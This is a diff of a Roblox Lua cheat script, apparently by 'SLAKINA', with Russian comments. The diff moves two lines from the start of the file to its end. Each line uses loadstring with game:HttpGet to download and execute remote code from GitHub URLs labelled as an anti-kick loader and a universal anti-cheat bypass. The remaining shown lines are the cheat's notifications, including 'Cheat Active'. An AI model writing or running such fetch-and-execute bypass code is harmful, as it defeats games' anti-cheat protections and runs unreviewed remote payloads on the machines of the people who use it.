@@ -1,8 +1,3 @@
--- Universal Anti-Kick & Anti-Cheat Bypass
-loadstring(game:HttpGet("https://raw.githubusercontent.com/welomenchaina/Loader/refs/heads/main/AntiKickLoader", true))()
-
--- Дополнительная защита от популярных систем (Adonis/Anticheat)
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Next1x/Nextix./main/UniversalACBypass"))()
 game.StarterGui:SetCore("SendNotification", {
     Title = "LOADING"; -- Заголовок
     Text = "LOAD PATCH"; -- Текст
@@ -1161,3 +1156,8 @@ RunService.RenderStepped:Connect(updateHealth)
 
 
 Notify("Cheat Active", "Приятной игры с читами от SLAKINA, " .. game.Players.LocalPlayer.Name .. "!")
+-- Universal Anti-Kick & Anti-Cheat Bypass
+loadstring(game:HttpGet("https://raw.githubusercontent.com/welomenchaina/Loader/refs/heads/main/AntiKickLoader", true))()
+
+-- Дополнительная защита от популярных систем (Adonis/Anticheat)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Next1x/Nextix./main/UniversalACBypass"))()
